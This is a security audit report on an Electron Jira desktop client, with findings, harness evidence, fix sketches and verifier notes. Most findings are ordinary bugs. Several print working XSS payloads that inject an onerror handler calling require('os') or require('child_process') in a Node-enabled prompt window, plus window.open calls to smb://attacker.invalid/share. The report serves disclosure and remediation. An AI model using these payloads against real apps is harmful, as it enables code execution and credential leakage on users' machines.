## prompt-html-injection-node-rce [medium]
- **Title:** Jira URL is pasted unescaped into a prompt window that has Node enabled, so a crafted URL runs code on the machine
- **Location:** src/main/main.ts:174-176, 227
- **Detail:** promptForJiraUrl builds its HTML by inserting `value="${this.jiraUrl}"` directly into a data: URL page. That window is created with nodeIntegration:true and contextIsolation:false. A jiraUrl containing `">` closes the attribute and injects markup. Because the page has `require`, any injected script gets full Node access. Today jiraUrl can be set two ways. One is the prompt itself (self-injection only). The other is ipcMain.handle('set-jira-url') at :153-157, which takes any string from any renderer with no sender, scheme or host check and stores it raw. Once the known preload-path bug is fixed, preload.ts exposes setJiraUrl to whatever page is in the main window. There is no will-navigate guard, so that page can be anything a link leads to. The page can then plant a payload that runs Node code the next time the user presses Cmd+U.
- **Evidence:** Harness <scratch> run against the built dist/main/main.js. The prompt window reports `typeof require` = 'function'. I submitted `https://h-audit-test.atlassian.net/jira?x="><img src=x onerror="document.title='PWN:'+typeof require+':'+require('os').userInfo().username">` and reopened Cmd+U. The prompt title became `PWN:function:<user>`. chain.js calls the registered invoke handler (ipcMain._invokeHandlers.get('set-jira-url'), which is what preload's setJiraUrl reaches) with `https://example.org/#"><img ... require('os').hostname()>`. The main window navigated to example.org, and the next Cmd+U prompt title was `NODE:<hostname>`.
- **Fix sketch:** Give the prompt window nodeIntegration:false, contextIsolation:true, sandbox:true, plus a small preload that exposes submit/cancel. Pass the current URL with webContents.send after load, or set it with JSON.stringify inside executeJavaScript; never interpolate it into the HTML. Route both IPC entry points through one validateJiraUrl() in main: new URL(), https only, host === '*.atlassian.net' or an explicit allowlist. Drop ipcMain.handle('set-jira-url') or check event.senderFrame.url against the app's own pages.
- **Verifier note:** Reproduced. main.ts:175-176 sets nodeIntegration:true and contextIsolation:false, and main.ts:227 interpolates ${this.jiraUrl} into the value attribute without escaping. I re-ran harness.js in <scratch> The prompt reports `typeof require: function`, and the injected value produced the title `PWN:function:<user>`. chain.js, which calls ipcMain._invokeHandlers.get('set-jira-url') directly, gave `NODE:<hostname>`. The handler at :153-157 does no validation, and preload.ts:12 exposes setJiraUrl. Severity is lower than claimed because nothing outside the user can reach this today. The harness logs `preload-error ... Cannot find module dist/preload/preload.js` and `electronAPI in page: undefined`. Child windows have no preload, so the only working entry point is the user typing a payload into their own prompt, which is self-XSS. The remote chain only works once the baseline preload path is fixed. Treat it as a must-fix that ships together with the preload fix (it becomes high then), not as high on the current build.

## ipc-once-listener-leak-crash [medium]
- **Title:** Cancelling the URL prompt once leaves a listener behind; every later submit then shows a main-process error dialog
- **Location:** src/main/main.ts:252-268
- **Detail:** Each Cmd+U registers `ipcMain.once('set-jira-url', ...)`, and that listener holds a reference to its own promptWindow. Closing the prompt with Cancel, Esc or the close button never sends the event, so the listener is never removed and its window is destroyed. On the next submit, every queued once-listener fires in order. The stale one runs normalisation and loadJiraApp, then calls `promptWindow.close()` on a destroyed window, which throws `TypeError: Object has been destroyed`. The app has no uncaughtException handler, so Electron's default shows the 'A JavaScript error occurred in the main process' dialog. The throw also aborts emit, so the fresh listener never runs and stays registered, now pointing at a window that closes itself. From then on, every submit in the session throws again. Opening two prompts and submitting in one also closes the other through the shared channel.
- **Evidence:** Harness run, basic scenario: `after cancel: windows 1 listeners 1`, then `after reopen: listeners 2`, then on submit `UNCAUGHT TypeError: Object has been destroyed | at IpcMainImpl.<anonymous> (dist/main/main.js:232:20) | at Object.onceWrapper (node:events:633:26)`, then `after submit: ... listeners 1` (leak persists). Electron's built-in handler, extracted from the Electron Framework strings: `process.on("uncaughtException",(function(e){process.listenerCount("uncaughtException")>1||... dialog.showErrorBox("A JavaScript error occurred in the main process",r)`.
- **Fix sketch:** Register one permanent `ipcMain.on('prompt-submit', ...)` in setupIpcHandlers. Keep a single `this.promptWindow` reference: if it is open, focus it instead of creating another. Match `event.sender === this.promptWindow.webContents`, and call close only after an `isDestroyed()` check. Alternatively, call removeListener in `promptWindow.on('closed')`.
- **Verifier note:** Reproduced, and without the harness's own uncaughtException handler. dlg.js stubs dialog.showErrorBox and shows only Electron's default handler (`uncaught listeners 1`). One Esc cancel leaves 1 listener (`after Esc windows 1 listeners 1`). After that, every submit across 3 rounds calls `showErrorBox: A JavaScript error occurred in the main process`, and the count stays at 1. The stack is `Object has been destroyed` at dist/main/main.js:232 (promptWindow.close() in main.ts:267). The mechanism is real, but each round also logged the new main URL (round0/1/2.atlassian.net/jira/projects). loadJiraApp runs before the throw, so the URL change still works and the process survives. The result is a recurring error dialog with no crash and no data loss, so medium rather than high.

## no-url-persistence-startup-marketing-page [high]
- **Title:** The chosen Jira URL is never saved, so every launch opens Atlassian's marketing site
- **Location:** src/main/main.ts:6, 81, 265
- **Detail:** jiraUrl lives only in a class field initialised to 'https://atlassian.net'. Nothing in main.ts writes it to disk: no fs, electron-store or userData file. Every launch loads https://atlassian.net, which returns a 301 to https://www.atlassian.com/software, the product marketing page. The user has to press Cmd+U and re-enter their site on every launch. README.md:53 says 'The app now launches directly to your Jira instance', which the code does not do. The first-run setup UI in dist/renderer/index.html (it has a config form and a loadSavedConfig()) is packaged into app.asar but main never loads it. Window size and position are not saved either: the window is always 1200x900 and no resize or move handler exists.
- **Evidence:** In the harness, profile userdata-a had a URL set to https://h-audit-test.atlassian.net/jira/projects during the basic scenario. After relaunching on that same profile: `[H] main url https://www.atlassian.com/software`. `curl -w '%{http_code} %{redirect_url}' https://atlassian.net` gives `301 https://www.atlassian.com/software`. `grep -n "writeFile|getBounds|store" src/main/main.ts` finds no matches. The packaged asar listing includes /dist/renderer/index.html, and main.ts never references it.
- **Fix sketch:** Store settings in `join(app.getPath('userData'),'settings.json')` as {jiraUrl, bounds, themeSource}. Read the file before createWindow and write it on a successful URL change and on window 'close'. If no valid jiraUrl is saved, open the URL prompt (or dist/renderer) instead of loading atlassian.net.
- **Verifier note:** main.ts:6 hard-codes 'https://atlassian.net'. Grepping main.ts for writeFile|readFile|getBounds|store|userData|fs finds nothing. `curl https://atlassian.net` gives `301 https://www.atlassian.com/software`, and a fresh harness launch logged `main url https://www.atlassian.com/software`. README.md:53 says 'The app now launches directly to your Jira instance', which is false. src/renderer/app.js has a localStorage-backed loadSavedConfig (lines 18, 143-153), but main.ts never loads dist/renderer (grepping main.ts for 'renderer' finds nothing). The app's core function, opening your Jira, fails on every launch, so high stands.

## url-normalization-corrupts-urls [medium]
- **Title:** URL normalisation appends /jira/projects to valid deep links and mangles an uppercase scheme
- **Location:** src/main/main.ts:256-263
- **Detail:** The scheme check is case-sensitive, so `HTTPS://acme.atlassian.net` becomes `https://HTTPS://acme.atlassian.net/jira/projects`. The '/jira' check is a substring test on the whole URL, so any Atlassian URL whose path doesn't contain '/jira' gets '/jira/projects' added after its path or query. Pasting an issue link like `.../browse/ABC-123` yields `.../browse/ABC-123/jira/projects`, and `/?filter=1` yields `/?filter=1/jira/projects`. `includes('atlassian.net')` also matches the string anywhere, including the query of a non-Atlassian host. Bare text like `acme` is accepted as `https://acme` with no error.
- **Evidence:** <scratch> is a verbatim copy of lines 253-263. Its output: `"https://acme.atlassian.net/browse/ABC-123" -> https://acme.atlassian.net/browse/ABC-123/jira/projects`; `"HTTPS://acme.atlassian.net" -> https://HTTPS://acme.atlassian.net/jira/projects`; `"https://acme.atlassian.net/?filter=1" -> https://acme.atlassian.net/?filter=1/jira/projects`; `"https://evil.example/?atlassian.net" -> https://evil.example/?atlassian.net/jira/projects`.
- **Fix sketch:** Parse with `new URL(/^[a-z]+:\/\//i.test(s) ? s : 'https://'+s)`, reject non-https, and check `u.hostname.endsWith('.atlassian.net')`. Add '/jira/projects' only when `u.pathname === '/'`. Show an inline error in the prompt instead of accepting invalid input.
- **Verifier note:** norm.js matches main.ts:253-263 line for line (I compared them). Re-running it gave the outputs claimed: /browse/ABC-123 -> .../browse/ABC-123/jira/projects; HTTPS:// -> https://HTTPS://...; ?filter=1 -> ?filter=1/jira/projects; /wiki/spaces/X -> .../wiki/spaces/X/jira/projects; 'acme' -> https://acme. Pasting an issue link is a realistic case and leads to a broken page. Medium is fair.

## window-open-substring-allowlist [medium]
- **Title:** The window-open allow rule matches 'atlassian.net' anywhere in the URL, so arbitrary sites open as in-app windows
- **Location:** src/main/main.ts:36
- **Detail:** `url.includes('atlassian.net') || url.startsWith(this.jiraUrl)` is a raw string test. Any URL with 'atlassian.net' in its query or fragment, such as `https://evil.example/?ref=atlassian.net`, passes. So do look-alike hosts like `https://atlassian.net.evil.example`, which also passes `startsWith` against the default jiraUrl. These open as chromeless Electron windows with no address bar instead of in the browser, which makes them good phishing surfaces inside a trusted app. Separately, no will-navigate handler exists, so plain links navigate the main window itself to any origin.
- **Evidence:** Harness: `window.open('https://example.org/?ref=atlassian.net')` from the main window produced `child window https://example.org/?ref=atlassian.net ... sandbox true`, an in-app window, and `openExternal calls []`. norm.js: `allow-in-app https://atlassian.net.evil.example/x true` and `allow-in-app https://evil.example/?atlassian.net true`. `grep -n will-navigate src/main/main.ts` finds no matches.
- **Fix sketch:** Use `const h = new URL(url).hostname; allow = url.startsWith('https:') && (h === 'atlassian.net' || h.endsWith('.atlassian.net') || h === new URL(this.jiraUrl).hostname)`. Add a `will-navigate` handler with the same check that calls preventDefault and opens the URL with shell.openExternal, restricted to http/https.
- **Verifier note:** main.ts:36 uses url.includes('atlassian.net') || url.startsWith(this.jiraUrl). In my harness run, window.open('https://example.org/?ref=atlassian.net') logged `child window https://example.org/?ref=atlassian.net ... sandbox true` and `openExternal calls []`, so the page opened in-app. norm.js shows https://atlassian.net.evil.example/x and https://evil.example/?atlassian.net both allowed. Grepping main.ts for will-navigate finds nothing. Child windows are sandboxed with no preload, so the risk is phishing or navigation rather than code execution. Medium holds.

## load-failure-blank-window [medium]
- **Title:** A bad or unreachable Jira URL leaves a blank white window with no error or retry
- **Location:** src/main/main.ts:81
- **Detail:** loadJiraApp calls `mainWindow.loadURL(this.jiraUrl)` without handling 'did-fail-load' or the returned promise. For a mistyped host or when offline, the window shows an empty document. Nothing tells the user what went wrong, and Cmd+U is the only way out. Combined with the lax normalisation, any typo, such as `acme` without the domain, ends up here.
- **Evidence:** Harness badurl scenario: after submitting `no-such-host.invalid`, `main url after bad host https://no-such-host.invalid/ title no-such-host.invalid` and `main html length 39` (an empty `<html><head></head><body></body></html>`).
- **Fix sketch:** Use `webContents.on('did-fail-load', (e, code, desc, url, isMainFrame) => { if (isMainFrame && code !== -3) show an error page or dialog with Retry and Change URL })`, and attach `.catch()` to loadURL.
- **Verifier note:** bad.js submitted 'no-such-host.invalid' through the prompt. Result: `did-fail-load -105 ERR_NAME_NOT_RESOLVED ... true`, main url https://no-such-host.invalid/, and html `<html><head></head><body></body></html>`. Electron only prints a console warning ('Failed to load URL') and the user sees nothing. main.ts:81 has no did-fail-load handler and no .catch. Medium is right for a UX gap where Cmd+U is the only way out.

## no-single-instance-lock [low]
- **Title:** No single-instance lock: a second launch starts a second full app sharing the same profile
- **Location:** src/main/main.ts:12-31
- **Detail:** app.requestSingleInstanceLock() is never called. On Windows and Linux, launching again (Start menu, .desktop file, AppImage) starts a second main process. It gets its own window and theme/IPC handlers and uses the same Chromium userData: cookies, IndexedDB and Local Storage. On macOS, LaunchServices normally reuses the running app, but `open -n` or the CLI still duplicates it.
- **Evidence:** Two harness instances launched 2 s apart with the same userData (H_TAG=shared). Both logged `singleInstanceLock false` and `main url https://www.atlassian.com/software visible true`, so two live windows ran on one profile.
- **Fix sketch:** At the top of initializeApp, `if (!app.requestSingleInstanceLock()) { app.quit(); return }`, plus `app.on('second-instance', () => { if (mainWindow) { if (mainWindow.isMinimized()) mainWindow.restore(); mainWindow.focus() } })`.
- **Verifier note:** Grepping main.ts for requestSingleInstanceLock|second-instance finds nothing, and my harness run logged `singleInstanceLock false`. A second launch on Windows/Linux, or `open -n` on macOS, starts a second main process on the same userData. Low is appropriate.

## packaged-icon-path-wrong [low]
- **Title:** BrowserWindow icon path points inside app.asar, but electron-builder puts resources in extraResources
- **Location:** src/main/main.ts:53
- **Detail:** `join(__dirname, '../../resources/icon.png')` works in dev, where __dirname is dist/main. In a packaged build, __dirname is `.../Resources/app.asar/dist/main`, so the path resolves to `app.asar/resources/icon.png`. That file doesn't exist: package.json `files` excludes resources/, and `extraResources` copies them to `<resourcesPath>/resources/`. On Linux (AppImage/deb/rpm) the runtime window and taskbar icon fall back to the default. macOS ignores this option.
- **Evidence:** Built an unsigned mac dir package into scratch with `CSC_IDENTITY_AUTO_DISCOVERY=false npx electron-builder --mac dir --arm64 -c.directories.output=<scratch>`. The asar listing has only /dist/** and /package.json at the top level. Node check: `main.ts icon resolves to .../Contents/Resources/app.asar/resources/icon.png in asar? false`; `real location exists: true` at Contents/Resources/resources/icon.png.
- **Fix sketch:** Use `icon: app.isPackaged ? join(process.resourcesPath, 'resources', 'icon.png') : join(__dirname, '../../resources/icon.png')`.
- **Verifier note:** package.json `files` = dist/**, node_modules/**, package.json, and extraResources copies resources -> resources. I listed the app.asar of the prior packaged build: its top level holds only /dist, /node_modules and /package.json, with 0 entries under /resources. Contents/Resources/resources/ does contain icon.png, icon.ico and icon.icns. So main.ts:53 resolves to app.asar/resources/icon.png in a packaged build, and that file doesn't exist. Per electron.d.ts the option only matters on Windows and Linux, so low.

## prompt-window-rce-via-jiraurl [high]
- **Title:** Unescaped jiraUrl in a nodeIntegration:true prompt window gives remote code execution; any web page in the main window can plant the payload over IPC
- **Location:** src/main/main.ts:227
- **Detail:** promptForJiraUrl() opens a BrowserWindow with nodeIntegration:true and contextIsolation:false (main.ts:174-177). It puts this.jiraUrl into the HTML attribute value="${this.jiraUrl}" (main.ts:227) without escaping, then loads that HTML as a data: URL (main.ts:249). this.jiraUrl can be set in two ways. (a) The user pastes a value into the prompt. The normalizer at main.ts:252-265 only adds 'https://' in front, so the payload survives. (b) The 'set-jira-url' ipcMain.handle (main.ts:153-157) assigns any string it receives. It does no validation and no sender check, and the preload gives it to every page as window.electronAPI.setJiraUrl. The chain: any origin loaded in the main window calls setJiraUrl('"><img src=x onerror="require(...)">'). The next time the user presses Cmd+U, that HTML runs with full Node in the prompt window, which is arbitrary code execution as the user. Right now this is blocked only by the known baseline bug (the preload path is wrong, so electronAPI is missing). Fixing that bug arms the full chain, so the two must be fixed together.
- **Evidence:** 1) A node one-liner (<scratch> reproduces the main.ts:227 template. The output is `<input type="url" id="url" value=""><img src=x onerror="require(`child_process`)..."><x a="" ...>`, which breaks out of the attribute. A reproduction of the normalizer only adds 'https://' and keeps the payload. 2) Full end-to-end run in installed Electron 32.3.3 (<scratch> It uses the real built dist/preload/index.js, the same main-window webPreferences, the same set-jira-url handler, and the prompt template sliced from main.ts source. A page at http://localhost:<port>/evil called window.electronAPI.setJiraUrl(payload). Log: `set-jira-url from http://localhost:65266/evil -> "\"><img src=x onerror=..."`. After that the prompt window rendered, and its onerror wrote the marker file: `marker file: RCE via prompt window, node v20.18.1`.
- **Fix sketch:** Remove nodeIntegration from the prompt. Give it its own preload with sandbox:true and contextIsolation:true that exposes only submit(url) and cancel(). Do not interpolate data into the HTML. Pass the current URL over IPC (or URLSearchParams) and assign it with input.value = ... in the page, or ship the prompt as a static file loaded with loadFile. Validate in the main process for every path that sets jiraUrl (both set-jira-url handlers): `const u = new URL(raw); if (u.protocol !== 'https:' || !(u.hostname === 'atlassian.net' || u.hostname.endsWith('.atlassian.net'))) throw ...`. Store u.toString(), not the raw input. In ipcMain.handle('set-jira-url'), reject senders whose event.senderFrame is not the main window's top frame on the configured Jira origin, or drop setJiraUrl from the preload entirely, since only the (dead) settings page uses it.
- **Verifier note:** Reproduced. The code matches the claim: main.ts:174-177 sets nodeIntegration:true and contextIsolation:false, main.ts:227 interpolates the value raw, main.ts:249 loads it as a data: URL, and main.ts:153-157 assigns any string with no checks. I re-ran the harness in my own scratch dir (<scratch> on installed Electron 32.3.3 with the real dist/preload/index.js and the template sliced from main.ts. I got `set-jira-url from http://localhost:49273/evil -> "\"><img src=x onerror=...` and the marker file contained `RCE via prompt window, node v20.18.1`. It is not critical today, though. The harness loads the preload from its real path, but dist/main/main.js:46 loads `../preload/preload.js`, which does not exist (baseline fact 1). So window.electronAPI is missing in the shipped app, and no remote page can set jiraUrl. The only live path is the user pasting a payload into the prompt, which is self-XSS. It becomes remote code execution as soon as the preload path is fixed, so the two fixes must land together, but it is latent today.

## no-navigation-guard [medium]
- **Title:** No will-navigate / will-redirect guard: the main window, which carries the preload API, can navigate to any origin and keep electronAPI
- **Location:** src/main/main.ts:34-42
- **Detail:** The only per-webContents hook is setWindowOpenHandler. There is no 'will-navigate', 'will-redirect' or 'will-frame-navigate' handler anywhere (grep finds none). So a link click, a redirect, or location.href from any page (Jira content, a malicious link in an issue, an open redirect) loads an arbitrary origin into the main window. The preload is attached to the window, not to an origin, so that origin gets window.electronAPI (setJiraUrl, which feeds the RCE above; getTheme; onThemeChanged; process.versions). Electron's security checklist item 13 ('Disable or limit navigation') covers exactly this case.
- **Evidence:** `grep -n "will-navigate\|will-redirect\|setPermission\|openExternal" src/main/main.ts` returns only line 39 (openExternal). In the Electron 32.3.3 harness, the main window loaded http://127.0.0.1:<port>/ and then set location.href to http://localhost:<port>/evil, a different origin. Log: `main window navigated to http://localhost:65266/evil` and then `main title: evil: setJiraUrl ok=true api=object`. The foreign origin had electronAPI and called into main.
- **Fix sketch:** In the web-contents-created handler, add `contents.on('will-navigate', (e, url) => { if (!isAllowedJiraUrl(url)) { e.preventDefault(); openExternalSafe(url) } })` and the same for 'will-redirect'. isAllowedJiraUrl should parse with new URL and require protocol 'https:' and a hostname that equals the configured Jira host or ends with '.atlassian.net', plus any Atlassian login hosts actually needed (e.g. id.atlassian.com). Check these hosts against a real login flow before shipping the list. The prompt window should block all navigation.
- **Verifier note:** Confirmed that main.ts has no will-navigate or will-redirect handler. The only per-webContents hook is setWindowOpenHandler at main.ts:34-42. My re-run of the harness logged `main window navigated to http://localhost:49273/evil` and then `evil: setJiraUrl ok=true api=object`. The headline impact, a foreign origin holding electronAPI, depends on the preload loading, and the shipped build does not load it (dist/main/main.js:46 points at preload.js, while the build emits index.js). That API path is also the same chain as the prompt-window RCE finding. The impact that is live today is an arbitrary origin rendered in the chromeless, sandbox:false main window (phishing, and it widens the attack surface for the other findings). That is real and worth fixing, but medium, not high.

## openexternal-arbitrary-schemes [high]
- **Title:** setWindowOpenHandler sends every non-matching URL to shell.openExternal with no scheme check (smb:, custom protocol handlers)
- **Location:** src/main/main.ts:39
- **Detail:** Any window.open or target=_blank URL that fails the atlassian check goes straight to shell.openExternal(url), whatever its scheme. So any web content in the app can launch smb:// (Finder mounts or connects to an attacker share), x-apple.systempreferences:, and every custom URL scheme registered on the machine (vscode:, zoommtg:, ms-*, and so on) with attacker-chosen arguments. There is no user confirmation. Electron security checklist item 15 says: 'Do not use shell.openExternal with untrusted content'.
- **Evidence:** In the Electron 32.3.3 harness the handler at main.ts:34-42 is copied verbatim and shell.openExternal is stubbed to record calls. A page ran window.open() with file:///System/Applications/Calculator.app, smb://attacker.invalid/share and x-apple.systempreferences:com.apple.preference.security. Recorded: `shell.openExternal received: ["smb://attacker.invalid/share","x-apple.systempreferences:com.apple.preference.security"]`. The file: URL was dropped by Chromium before it reached the handler. smb: and the custom scheme went through.
- **Fix sketch:** `const u = new URL(url); if (u.protocol === 'https:' || u.protocol === 'http:' || u.protocol === 'mailto:') shell.openExternal(u.toString());` Drop everything else, or ask first with dialog.showMessageBox. That also gives the currently unused 'dialog' import a purpose. Wrap new URL in try/catch.
- **Verifier note:** main.ts:39 calls shell.openExternal(url) on every URL that fails the main.ts:36 check, with no scheme filter. My re-run recorded `shell.openExternal received: ["smb://attacker.invalid/share","x-apple.systempreferences:com.apple.preference.security"]`, and window.open with no user gesture reached the handler. Unlike the preload-dependent findings, this works in the current build: setWindowOpenHandler is installed on every webContents through web-contents-created and does not need the preload. Any page that reaches the window can trigger it, and because navigation is unguarded, one click on a link in Jira content is enough. The Windows MSI target makes smb:/custom-scheme abuse (NTLM leak, protocol-handler bugs) concrete. High stands.
